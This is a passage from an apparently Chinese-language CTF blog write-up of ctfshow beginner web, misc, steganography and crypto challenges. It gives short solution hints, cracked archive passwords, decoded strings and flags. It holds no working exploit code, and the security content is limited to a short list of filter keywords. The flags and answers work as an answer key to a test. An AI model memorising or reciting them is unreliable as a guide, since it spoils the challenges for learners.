+<h3 id="Web18"><a class="header-anchor" href="#Web18">¶</a>Web18</h3>
+<p>过滤新增:
+Web18新增 <code>file</code>
+Web19新增 <code>base</code>
+Web20新增 <code>rot</code>
+Web21新增 <code>:</code></p>
+<h3 id="Web24"><a class="header-anchor" href="#Web24">¶</a>Web24</h3>
+<p>因为只需要把23的拿过来改成rand(0,300)和sleep(3)就可以了,就是那个(ts + 1)变成(ts + 3)</p>
+<h2 id="Misc"><a class="header-anchor" href="#Misc">¶</a>Misc</h2>
+<hr>
+<h3 id="杂项"><a class="header-anchor" href="#杂项">¶</a>杂项</h3>
+<p>杂项1: md5在线解码
+杂项2: winhex拉到底或者在stegsolve中analyse-&gt;file format
+杂项3: 看图写话971015
+杂项4: archpr爆破压缩包密码:372619038
+杂项5: 所有大写字母拿出来就是flag, FLAG{CTFSHOWNB}
+杂项10: 离远点眯眼, 能看出 我好喜欢你 (所以为什么没有9)</p>
+<h3 id="隐写1"><a class="header-anchor" href="#隐写1">¶</a>隐写1</h3>
+<p>隐写1: 打不开的png文件, winhex打开发现是文件头错了, 修改即可
+隐写2: jpeg隐写, 同杂项11
+萌新隐写5: 用winhex打开后提取有用字符然后base32解码(其实我用的cyberchef自动解码):
+MZWGCZZINBQW6X3KNF2V6YTVL54W63THL5RDGMS7FE======</p>
+<blockquote>
+<p>特征似乎是字符全大写, 后5位=补齐</p>
+</blockquote>
+<h3 id="萌新-隐写2"><a class="header-anchor" href="#萌新-隐写2">¶</a>萌新 隐写2</h3>
+<p>直接拿去爆破压缩包密码, 得到<code>19981000</code></p>
+<h3 id="萌新-隐写4"><a class="header-anchor" href="#萌新-隐写4">¶</a>萌新 隐写4</h3>
+<p>word选项-&gt;显示-&gt;隐藏文字</p>
+<h3 id="萌新-隐写3"><a class="header-anchor" href="#萌新-隐写3">¶</a>萌新 隐写3</h3>
+<p>就写在图片上</p>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto">¶</a>Crypto</h2>
+<hr>
+<h3 id="萌新-密码2"><a class="header-anchor" href="#萌新-密码2">¶</a>萌新_密码2</h3>
+<p>就是这几个字符在键盘上分别把<code>fwy</code>三个字母围了起来,加上KEY{}提交即可</p>
+<h3 id="萌新-密码3"><a class="header-anchor" href="#萌新-密码3">¶</a>萌新 密码3</h3>
+<p>首先是莫斯电码解码,这些斜杠解码后只是空格, 我直接去掉了, 得到如下字符串
+<code>MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</code>
+后面这里是bacon密码, 因为只识别AB,所以换成AB
+两个都试过了, <code>AABBABABAAABBBABABBAAAAAAABBABAABBA</code>靠谱, 解出来<code>guowang</code>
+要大写提交, 我不到啊</p>
+<h3 id="萌新-密码-4"><a class="header-anchor" href="#萌新-密码-4">¶</a>萌新 密码#4</h3>
+<p><code>QW8obWdIWF5FKUFSQW5URihKXWZAJmx0OzYiLg==</code>
+CyberChef一把梭: base64+HTML Entity+base85</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://4reexile.github.io">Creexile</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://4reexile.github.io/article/ctfshow-mengxin/">https://4reexile.github.io/article/ctfshow-mengxin/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/%E9%9A%90%E5%86%99/">隐写</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/lateral-movement/" title="横向移动"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">横向移动</div></div></a></div><div class="next-post pull-right"><a href="/article/vulnstack-3/" title="vulnstack-红日3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">vulnstack-红日3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/ctfshow-caogou/" title="ctfshow_菜狗杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-28</div><div class="title">ctfshow_菜狗杯</div></div></a></div><div><a href="/article/ctfshow-webbasic-phpcve/" title="Web入门_phpCVE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">Web入门_phpCVE</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-2/" title="Web入门_php特性_2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">Web入门_php特性_2</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-1/" title="Web入门_php特性_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-24</div><div class="title">Web入门_php特性_1</div></div></a></div><div><a href="/article/ctfshow-webbasic-php-3/" title="Web入门_php特性_3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-31</div><div class="title">Web入门_php特性_3</div></div></a></div><div><a href="/article/ctfshow-webbasic-rce-1/" title="Web入门_命令执行_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-04</div><div class="title">Web入门_命令执行_1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web1"><span class="toc-number">1.1.</span> <span class="toc-text">Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web10"><span class="toc-number">1.2.</span> <span class="toc-text">web10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web17"><span class="toc-number">1.3.</span> <span class="toc-text">Web17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web22"><span class="toc-number">1.4.</span> <span class="toc-text">Web22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E7%99%BE%E5%88%86%E7%99%BE%E7%9A%84%E5%BF%AB%E4%B9%90"><span class="toc-number">1.5.</span> <span class="toc-text">获得百分百的快乐</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web23"><span class="toc-number">1.6.</span> <span class="toc-text">Web23</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B96"><span class="toc-number">2.1.</span> <span class="toc-text">杂项6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B97-8"><span class="toc-number">2.2.</span> <span class="toc-text">杂项7,8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B911"><span class="toc-number">2.3.</span> <span class="toc-text">杂项11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E9%9A%90%E5%86%996"><span class="toc-number">2.4.</span> <span class="toc-text">萌新 隐写6</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E5%AF%86%E7%A0%811"><span class="toc-number">3.1.</span> <span class="toc-text">萌新_密码1</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">价值不多</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">4.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2-7"><span class="toc-number">4.1.1.</span> <span class="toc-text">Web2-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web8"><span class="toc-number">4.1.2.</span> <span class="toc-text">Web8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web9"><span class="toc-number">4.1.3.</span> <span class="toc-text">Web9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web11-15"><span class="toc-number">4.1.4.</span> <span class="toc-text">Web11-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web16"><span class="toc-number">4.1.5.</span> <span class="toc-text">Web16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web18"><span class="toc-number">4.1.6.</span> <span class="toc-text">Web18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web24"><span class="toc-number">4.1.7.</span> <span class="toc-text">Web24</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9"><span class="toc-number">4.2.1.</span> <span class="toc-text">杂项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E5%86%991"><span class="toc-number">4.2.2.</span> <span class="toc-text">隐写1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E9%9A%90%E5%86%992"><span class="toc-number">4.2.3.</span> <span class="toc-text">萌新 隐写2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E9%9A%90%E5%86%994"><span class="toc-number">4.2.4.</span> <span class="toc-text">萌新 隐写4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E9%9A%90%E5%86%993"><span class="toc-number">4.2.5.</span> <span class="toc-text">萌新 隐写3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E5%AF%86%E7%A0%812"><span class="toc-number">4.3.1.</span> <span class="toc-text">萌新_密码2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E5%AF%86%E7%A0%813"><span class="toc-number">4.3.2.</span> <span class="toc-text">萌新 密码3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E6%96%B0-%E5%AF%86%E7%A0%81-4"><span class="toc-number">4.3.3.</span> <span class="toc-text">萌新 密码#4</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
